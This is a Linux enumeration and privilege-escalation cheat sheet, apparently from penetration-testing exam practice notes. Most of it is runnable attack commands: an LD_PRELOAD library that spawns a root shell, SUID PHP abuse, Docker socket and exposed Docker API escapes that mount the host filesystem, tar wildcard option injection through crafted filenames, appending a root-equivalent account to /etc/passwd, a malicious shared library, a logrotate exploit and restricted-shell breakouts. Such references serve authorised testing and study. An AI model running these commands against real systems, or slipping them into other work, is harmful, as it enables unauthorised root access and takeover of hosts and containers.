# Linux enumeration and privilege escalation

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options.

## Linux Enumeration

```bash
id && sudo -l && env                                                # show user, sudo rights, and environment
cat ~/.bashrc                                                       # inspect shell startup commands
cat /etc/passwd /etc/hosts /etc/fstab /etc/crontab                  # review users, hosts, mounts, and cron
lsblk && ss -tulpn && ps -auxf                                      # list disks, listeners, and processes
ls -lahv /opt /home                                                 # inspect common app and user directories
find / -perm -4000 2>/dev/null | xargs ls -la                       # SUID binaries
find / -type f -perm /4000 2>/dev/null                              # find files with any SUID bit set
find / -type f -user root -perm -4000 2>/dev/null                   # find root-owned SUID files
find / -writable -type d 2>/dev/null                                # find writable directories
find / -cmin -60 2>/dev/null                                        # changed in last 60 min
find ./ -type f -exec grep --color=always -i -I 'password' {} \;    # search local files for passwords
getfacl <LOCAL_DIRECTORY>                                           # show file ACLs
/usr/share/peass/linpeas.sh                                         # run LinPEAS enumeration
```

## Linux Privilege Escalation

### Sudo Bypass

```bash
# LD_PRELOAD
# shell.c:
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }

gcc -o shell.so shell.c -shared -FPIC -nostartfiles    # compile LD_PRELOAD shared object
sudo LD_PRELOAD=/path/to/shell.so <BINARY>             # run sudo binary with injected library
```

### SUID Abuse

```bash
find / -perm -u=s -type f 2>/dev/null                    # find SUID binaries
/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"    # abuse SUID PHP for root shell
sudo /usr/sbin/apache2 -f <FILE>                         # read first line as root
```

### Capabilities

```bash
capsh --print                        # show current Linux capabilities
/usr/sbin/getcap -r / 2>/dev/null    # find files with capabilities
```

### Docker / Container Escape

```bash
cat /proc/1/cgroup                                                                             # check for container cgroup context
test -f /.dockerenv && echo "inside docker"                                                    # check for Docker marker file
find / -name docker.sock 2>/dev/null                                                           # find mounted Docker socket
ip route                                                                                       # identify default gateway from container
cat /etc/hosts                                                                                 # review Docker host aliases and internal DNS
curl -s http://<DOCKER_HOST>:2375/_ping                                                        # test unauthenticated Docker API
curl -s http://<DOCKER_HOST>:2375/version                                                      # show Docker engine and API version
curl -s http://<DOCKER_HOST>:2375/info                                                         # enumerate Docker host info
curl -s "http://<DOCKER_HOST>:2375/containers/json?all=1"                                      # list all containers
curl -s http://<DOCKER_HOST>:2375/images/json                                                  # list cached images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host alpine chroot /host sh           # escape through mounted Docker socket
docker -H tcp://<DOCKER_HOST>:2375 run --rm -it -v /:/host alpine chroot /host sh              # escape through exposed Docker API
docker -H tcp://<DOCKER_HOST>:2375 run --rm -v /mnt/host/c:/host alpine ls /host/Users         # enumerate Windows host drive through WSL2
```

```bash
cat > /tmp/docker-mount.json <<'EOF'                                                                                                             # write Docker API bind-mount payload
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "<COMMAND>"],
  "HostConfig": {
    "Binds": ["<HOST_PATH>:/mnt/host"]
  }
}
EOF
curl -s -X POST -H "Content-Type: application/json" -d @/tmp/docker-mount.json "http://<DOCKER_HOST>:2375/containers/create?name=<CONTAINER>"    # create container with host bind mount
curl -s -X POST "http://<DOCKER_HOST>:2375/containers/<CONTAINER>/start"                                                                         # start bind-mount container
curl -s "http://<DOCKER_HOST>:2375/containers/<CONTAINER>/logs?stdout=1&stderr=1" | strings                                                      # strip Docker log framing and print output
curl -s -X DELETE "http://<DOCKER_HOST>:2375/containers/<CONTAINER>?force=1"                                                                     # remove bind-mount container
```

### Wildcard Abuse

```bash
touch -- --checkpoint=1                            # create tar checkpoint option file
touch -- '--checkpoint-action=exec=sh shell.sh'    # create tar checkpoint command file
```

### Writable /etc/passwd

```bash
openssl passwd <PASSWORD>                                             # generate passwd-compatible hash
echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd    # add root-equivalent user
su root2                                                              # switch to injected root user
```

### Shared Library Misconfiguration

```bash
ldd /PATH/TO/BINARY    # inspect shared library dependencies
# shell.c: #include <stdlib.h> ... void _init() { setuid(0); setgid(0); system("/bin/bash -i"); }
gcc -shared -fPIC -nostartfiles -o <LIBRARY>.so <FILE>.c    # compile malicious shared library
sudo LD_LIBRARY_PATH=/path/to/lib <BINARY>                  # run binary with controlled library path
```

### logrotten (Log Rotation Exploit)

```bash
./logrotten -p ./payloadfile /tmp/log/pwnme.log            # exploit writable logrotate target
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log    # if compress option set
```

### rbash Breakouts

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin    # restore common PATH
less /etc/profile → !/bin/sh                                                      # break out from less
vi -c ':!/bin/sh' /dev/null                                                       # break out from vi
ssh <USERNAME>@<RHOST> -t sh                                                      # force non-rbash shell over SSH
```

### Writable Directories

```
/dev/shm
/tmp
```
